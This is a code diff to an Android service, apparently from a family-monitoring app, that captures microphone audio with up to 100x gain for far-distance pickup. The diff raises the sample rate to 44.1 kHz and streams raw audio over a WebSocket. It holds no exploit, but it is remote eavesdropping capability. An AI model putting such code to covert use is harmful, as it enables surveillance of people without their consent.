@@ -37,18 +37,18 @@ class LiveListenService : Service() {
     companion object {
         private const val TAG = "LiveListenService"
         private const val NOTIFICATION_ID = 1006
-        private const val SAMPLE_RATE = 16000 // 16kHz for smooth streaming (less data)
+        private const val SAMPLE_RATE = 44100 // 44.1kHz CD quality for high-fidelity streaming
         private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
         private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
         private const val WAKELOCK_TAG = "FamilyGuard:LiveListen"
         
         // AGC (Automatic Gain Control) settings - SMOOTHER for far distance
-        private const val TARGET_LEVEL = 20000.0 // Lower target to prevent clipping
+        private const val TARGET_LEVEL = 22000.0 // Slightly higher target for clearer audio
         private const val AGC_ATTACK = 0.005 // Slower attack to prevent harsh jumps
         private const val AGC_RELEASE = 0.0002 // Very slow release for stable gain
         private const val MIN_GAIN = 1.0 // Minimum gain
         private const val MAX_GAIN = 100.0 // Maximum gain boost (100x for far distance)
-        private const val NOISE_FLOOR = 50 // Very low noise floor
+        private const val NOISE_FLOOR = 40 // Even lower noise floor for more sensitivity
     }
     
     private var currentGain = 20.0 // Start with 20x gain for far distance capture
@@ -430,40 +430,52 @@ class LiveListenService : Service() {
             return
         }
         
-        // Use MUCH larger buffer for smooth continuous streaming (8x minimum)
-        val minBuffer = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
-        val bufferSize = minBuffer * 8
+        // Try 44.1kHz first, fall back to 16kHz if needed
+        val sampleRates = listOf(44100, 16000)
+        var activeSampleRate = SAMPLE_RATE
         
         // Try VOICE_RECOGNITION first (best for far distance, has hardware AGC)
+        // Then UNPROCESSED (raw, highest quality)
         // Then CAMCORDER (another sensitive source)
         // Then MIC as fallback
         val audioSources = listOf(
             MediaRecorder.AudioSource.VOICE_RECOGNITION,
+            MediaRecorder.AudioSource.UNPROCESSED,
             MediaRecorder.AudioSource.CAMCORDER,
-            MediaRecorder.AudioSource.MIC,
-            MediaRecorder.AudioSource.UNPROCESSED
+            MediaRecorder.AudioSource.MIC
         )
         
-        for (source in audioSources) {
-            try {
-                audioRecord = AudioRecord(
-                    source,
-                    SAMPLE_RATE,
-                    CHANNEL_CONFIG,
-                    AUDIO_FORMAT,
-                    bufferSize
-                )
-                
-                if (audioRecord?.state == AudioRecord.STATE_INITIALIZED) {
-                    Log.d(TAG, "AudioRecord initialized with source: $source, buffer: $bufferSize")
-                    break
-                } else {
-                    audioRecord?.release()
+        var initialized = false
+        for (rate in sampleRates) {
+            if (initialized) break
+            for (source in audioSources) {
+                try {
+                    val minBuf = AudioRecord.getMinBufferSize(rate, CHANNEL_CONFIG, AUDIO_FORMAT)
+                    if (minBuf <= 0) continue
+                    // Use 10x buffer for ultra-smooth continuous streaming
+                    val bufSize = minBuf * 10
+                    
+                    audioRecord = AudioRecord(
+                        source,
+                        rate,
+                        CHANNEL_CONFIG,
+                        AUDIO_FORMAT,
+                        bufSize
+                    )
+                    
+                    if (audioRecord?.state == AudioRecord.STATE_INITIALIZED) {
+                        activeSampleRate = rate
+                        Log.d(TAG, "AudioRecord initialized: source=$source, rate=${rate}Hz, buffer=$bufSize")
+                        initialized = true
+                        break
+                    } else {
+                        audioRecord?.release()
+                        audioRecord = null
+                    }
+                } catch (e: Exception) {
+                    Log.w(TAG, "Failed to init AudioRecord with source $source @${rate}Hz", e)
                     audioRecord = null
                 }
-            } catch (e: Exception) {
-                Log.w(TAG, "Failed to init AudioRecord with source $source", e)
-                audioRecord = null
             }
         }
         
@@ -474,9 +486,11 @@ class LiveListenService : Service() {
         
         audioRecord?.startRecording()
         
+        val finalSampleRate = activeSampleRate
         serviceScope.launch(Dispatchers.IO) {
-            // Use smaller read chunks for smoother streaming
-            val chunkSize = minBuffer / 2
+            // Optimal chunk size for smooth streaming at higher sample rate
+            val minBuf = AudioRecord.getMinBufferSize(finalSampleRate, CHANNEL_CONFIG, AUDIO_FORMAT)
+            val chunkSize = if (finalSampleRate >= 44100) minBuf else minBuf / 2
             val buffer = ShortArray(chunkSize)
             
             while (isStreaming && audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
@@ -490,7 +504,7 @@ class LiveListenService : Service() {
             }
         }
         
-        Log.d(TAG, "Audio capture started - FAR DISTANCE MODE (100x max gain)")
+        Log.d(TAG, "Audio capture started - HIGH QUALITY FAR DISTANCE MODE (${activeSampleRate}Hz, 100x max gain)")
     }
     
     /**
@@ -576,7 +590,7 @@ class LiveListenService : Service() {
         if (webSocketClient?.isOpen != true) return
         
         try {
-            // Send raw PCM data (32kbps equivalent at 16kHz mono 16-bit)
+            // Send raw PCM data (high quality at 44.1kHz mono 16-bit)
             val audioBase64 = Base64.encodeToString(data, Base64.NO_WRAP)
             webSocketClient?.send("audio:$audioBase64")
         } catch (e: Exception) {
